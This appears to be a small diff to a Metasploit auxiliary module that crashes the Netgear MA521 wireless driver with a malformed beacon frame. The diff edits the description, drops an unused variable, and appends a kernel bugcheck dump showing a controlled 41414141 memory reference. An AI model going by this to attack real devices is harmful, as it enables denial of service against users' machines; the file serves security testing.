@@ -17,7 +17,7 @@ class Auxiliary::Dos::Wireless::Netgear_MA521_Rates < Msf::Auxiliary
 				is triggered by an invalid supported rates information element.
 				
 				This DoS was tested with version 5.148.724.2003 of the MA521nd5.SYS driver and a 
-				NetGear MA521 PCMCIA adapter. A remote code execution module is also in development.
+				NetGear MA521 Cardbus adapter. A remote code execution module is also in development.
 
 				This module depends on the Lorcon library and only works on the Linux platform
 				with a supported wireless card. Please see the Ruby Lorcon documentation 
@@ -65,7 +65,6 @@ class Auxiliary::Dos::Wireless::Netgear_MA521_Rates < Msf::Auxiliary
 	def create_beacon
 		ssid     = Rex::Text.rand_text(6)
 		bssid    = Rex::Text.rand_text(6)
-		channel  = datastore['CHANNEL'].to_i
 		seq      = [rand(255)].pack('n')
 		
 		frame = 
@@ -94,3 +93,22 @@ class Auxiliary::Dos::Wireless::Netgear_MA521_Rates < Msf::Auxiliary
 	end
 end
 end
+
+=begin
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)
+An attempt was made to access a pageable (or completely invalid) address at an
+interrupt request level (IRQL) that is too high.  This is usually
+caused by drivers using improper addresses.
+If kernel debugger is available get stack backtrace.
+Arguments:
+Arg1: 41414141, memory referenced
+Arg2: 00000002, IRQL
+Arg3: 00000000, value 0 = read operation, 1 = write operation
+Arg4: aa1ec75a, address which referenced memory
+=end
